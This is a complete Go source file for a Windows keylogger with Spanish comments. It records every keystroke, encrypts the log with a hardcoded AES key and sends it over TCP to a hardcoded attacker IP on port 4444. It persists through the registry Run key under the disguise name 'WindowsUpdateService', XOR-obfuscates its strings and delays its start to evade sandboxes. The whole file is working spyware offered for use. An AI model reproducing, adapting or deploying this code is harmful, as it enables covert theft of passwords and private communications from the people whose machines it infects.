package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// ---- Configuración ----
const (
	serverHost   = "195.0.1.5" // Cambiar por IP real de Parrot
	serverPort   = 4444
	sendInterval = 30 * time.Second
	hexKey       = "30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b"
)

// Strings ofuscadas con XOR (clave 0x5A) para no aparecer en texto plano en el binario
var (
	// "Software\Microsoft\Windows\CurrentVersion\Run" XOR 0x5A
	encRunKey = []byte{
		0x9, 0x35, 0x3c, 0x2e, 0x2d, 0x3b, 0x28, 0x3f, 0x6,
		0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3c, 0x2e, 0x6,
		0xd, 0x33, 0x34, 0x3e, 0x35, 0x2d, 0x29, 0x6,
		0x19, 0x2f, 0x28, 0x28, 0x3f, 0x34, 0x2e, 0xc, 0x3f, 0x28, 0x29, 0x33, 0x35, 0x34, 0x6,
		0x8, 0x2f, 0x34,
	}
	// "WindowsUpdateService" XOR 0x5A
	encAppName = []byte{
		0xd, 0x33, 0x34, 0x3e, 0x35, 0x2d, 0x29, 0xf,
		0x2a, 0x3e, 0x3b, 0x2e, 0x3f, 0x9, 0x3f, 0x28, 0x2c, 0x33, 0x39, 0x3f,
	}
)

func xorDecode(data []byte) string {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ 0x5A
	}
	return string(out)
}

// ---- Windows API ----
var (
	user32            = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKey   = user32.NewProc("GetAsyncKeyState")
	procGetKbState    = user32.NewProc("GetKeyboardState")
	procToUnicode     = user32.NewProc("ToUnicode")
	procMapVirtualKey = user32.NewProc("MapVirtualKeyW")
	advapi32          = syscall.NewLazyDLL("advapi32.dll")
	procRegOpenKey    = advapi32.NewProc("RegOpenKeyExW")
	procRegSetValue   = advapi32.NewProc("RegSetValueExW")
	procRegClose      = advapi32.NewProc("RegCloseKey")
)

const (
	hkcuHandle  = uintptr(0x80000001)
	keySetValue = uintptr(0x0002)
	regSZ       = uintptr(1)
)

// ---- Buffer thread-safe ----
var (
	mu  sync.Mutex
	buf []byte
)

func push(s string) {
	mu.Lock()
	buf = append(buf, s...)
	mu.Unlock()
}

func pop() []byte {
	mu.Lock()
	defer mu.Unlock()
	if len(buf) == 0 {
		return nil
	}
	out := make([]byte, len(buf))
	copy(out, buf)
	buf = buf[:0]
	return out
}

// ---- Conversión VK → string ----
func vkStr(vk uint32) string {
	scan, _, _ := procMapVirtualKey.Call(uintptr(vk), 0)
	var state [256]byte
	procGetKbState.Call(uintptr(unsafe.Pointer(&state[0])))
	var out [8]uint16
	n, _, _ := procToUnicode.Call(
		uintptr(vk), scan,
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&out[0])),
		uintptr(len(out)), 0,
	)
	if int32(n) > 0 {
		return string(utf16.Decode(out[:n]))
	}
	switch vk {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x2E:
		return "[DEL]"
	}
	return ""
}

// ---- Captura por polling (sin hook global) ----
func keylogLoop() {
	prev := make([]bool, 256)
	for {
		time.Sleep(10 * time.Millisecond)
		for vk := 8; vk < 256; vk++ {
			r, _, _ := procGetAsyncKey.Call(uintptr(vk))
			pressed := r&0x8000 != 0
			if pressed && !prev[vk] {
				s := vkStr(uint32(vk))
				if s != "" {
					push(fmt.Sprintf("[%s] %s\n",
						time.Now().Format("2006-01-02 15:04:05"), s))
				}
			}
			prev[vk] = pressed
		}
	}
}

// ---- Cifrado AES-256-GCM ----
func encrypt(plain, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil, err
	}
	return append(nonce, gcm.Seal(nil, nonce, plain, nil)...), nil
}

// ---- Envío TCP con length-prefix ----
func send(data []byte) {
	conn, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%d", serverHost, serverPort), 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(data)))
	conn.Write(append(hdr[:], data...))
}

// ---- Persistencia en registro ----
func addStartup() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	runPath, _ := syscall.UTF16PtrFromString(xorDecode(encRunKey))
	appNamePtr, _ := syscall.UTF16PtrFromString(xorDecode(encAppName))
	exeUTF16 := syscall.StringToUTF16(exe)

	var hkey uintptr
	r, _, _ := procRegOpenKey.Call(hkcuHandle,
		uintptr(unsafe.Pointer(runPath)), 0, keySetValue,
		uintptr(unsafe.Pointer(&hkey)))
	if r != 0 {
		return
	}
	defer procRegClose.Call(hkey)
	procRegSetValue.Call(hkey, uintptr(unsafe.Pointer(appNamePtr)), 0, regSZ,
		uintptr(unsafe.Pointer(&exeUTF16[0])), uintptr(len(exeUTF16)*2))
}

// ---- Hilo de envío periódico ----
func senderLoop(key []byte) {
	for {
		time.Sleep(sendInterval)
		data := pop()
		if data == nil {
			continue
		}
		enc, err := encrypt(data, key)
		if err != nil {
			continue
		}
		send(enc)
	}
}

func main() {
	// Pausa inicial para evadir sandboxes con límite de tiempo
	time.Sleep(5 * time.Second)

	key, _ := hex.DecodeString(hexKey)
	addStartup()
	go senderLoop(key)
	keylogLoop()
}
